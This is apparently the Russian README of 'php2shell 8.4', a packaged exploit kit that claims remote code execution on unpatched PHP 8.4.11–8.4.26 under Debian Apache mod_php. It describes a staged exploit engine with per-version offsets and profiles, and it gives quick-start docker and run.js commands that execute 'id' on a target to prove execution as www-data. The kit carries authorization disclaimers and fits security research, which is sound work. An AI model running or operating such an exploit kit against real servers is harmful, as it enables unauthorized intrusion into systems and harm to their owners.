# php2shell 8.4 — Debian Apache (mod_php)

16 рабочих эксплойтов для **PHP 8.4 до исправления** на цели
**Debian + Apache mod_php** (`apache2handler`) с профилем
`php.ini-production`.

> **Только авторизованное использование.** Запускайте только в своей
> лаборатории или на цели, на которую есть письменное разрешение. Успех —
> это файл proof на цели; без proof результат **не является RCE**.

Языки: [pt-BR](../../README.md) · [English](README.en.md) · [中文](README.zh.md) ·
[فارسی](README.fa.md) · [العربية](README.ar.md) · [Русский](README.ru.md) ·
[한국어](README.ko.md)




Мы независимо исследовали уязвимость по первичному бюллетеню, собрали PoC в лаборатории и затем сосредоточились на достижении production-контейнера.

## Поддерживаемые версии (16)

| Диапазон | Версии | `s_off` этапа 3 |
|:--|:--|:--|
| 8.4.11–8.4.26 | 16 версий | `0xF8398` |

## Что внутри

```text
engine/pure_fixed.js     движок A1→B1→A2→B2
profiles/*.json          16 профилей: символы, s_off, требования
run.js                   выбирает профиль и запускает движок
target/                  php.ini-production + Apache prefork 150 + index.php
tests/*.test.js   проверка всех 16 профилей
```

`run.js` не сканирует: он запускает **одну** версию за раз с файлом proof.

## Требования

- Node.js 20+ на машине оператора.
- Docker на цели/в лаборатории.
- Официальный образ `php:<version>-apache` (Debian) с примонтированными
  `target/php.ini` и `target/apache.conf`.
- Общий том для proof (`/out` на цели).

## Быстрый старт (локальная лаборатория)

```bash
mkdir -p out
docker run -d --name p2s-8426 -p 19300:80 \
  -v "$PWD/target/php.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/target/apache.conf:/etc/apache2/conf-enabled/zz-prod.conf:ro" \
  -v "$PWD/target/www:/var/www/html:ro" \
  -v "$PWD/out:/out" \
  php:8.4.26-apache

./run.js --version 8.4.26 --host 127.0.0.1 --port 19300 \
  --proof out/p1 --cmd 'id>/out/p1' --retries 4 --probes 6

cat out/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Замените `8.4.26` на нужный профиль и тег образа.

## Как читать результат

| Вывод | Значение |
|:--|:--|
| `out/p1` содержит `uid=...` | выполнение доказано |
| движок пишет proof, но файл пуст | **не RCE**; неудача |
| `leak failed` / `no proof` | выполнение не произошло; перезапустите цель |

Каждая попытка должна начинаться с чистого worker. `run.js` не
перезапускает контейнер автоматически.

## Честные ограничения

- Права `www-data`, не root.
- Результат зависит от точной сборки образа; фиксируйте tag/digest.

## Тесты

```bash
node --test
```

## Документация

- `docs/como-reproduzir.md` — пошагово и диагностика (pt-BR).

## Предупреждение

Это материал для авторизованных исследований безопасности. Не используйте
его против систем третьих лиц без разрешения. Ответственность за
использование несёт оператор.